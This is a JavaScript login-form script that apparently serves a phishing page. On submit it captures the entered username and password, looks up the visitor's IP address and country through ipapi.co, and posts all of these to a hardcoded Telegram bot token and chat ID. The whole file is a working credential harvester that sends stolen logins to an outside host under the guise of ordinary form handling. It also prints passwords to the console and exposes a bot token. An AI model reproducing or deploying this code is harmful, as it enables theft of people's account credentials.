document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function (event) {
        event.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Log for debugging
        console.log("Username:", username);
        console.log("Password:", password);

        if (!username || !password) {
            alert('Both username and password are required.');
            return;
        }

        // Get IP and location info
        fetch('https://ipapi.co/json/')
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                const ip = data.ip;
                const country = data.country_name;

                // Log for debugging
                console.log("IP:", ip);
                console.log("Country:", country);

                const message = `Username: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}`;

                // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with actual values
                const botToken = '7810271681:AAE3hUNHbuGo2Pz8wzYHJ23UfDwqav8nbao';
                const chatId = '5750932154';
                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                const payload = {
                    chat_id: chatId,
                    text: message
                };

                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`Telegram API error! status: ${response.status}`);
                    }
                    return response.json();
                })
                .then(data => {
                    if (!data.ok) {
                        throw new Error(`Telegram API error! description: ${data.description}`);
                    }
                    console.log('Message sent to Telegram successfully.');
                })
                .catch(error => {
                    console.error('Error sending message to Telegram:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP info:', error);
            });
    });
});
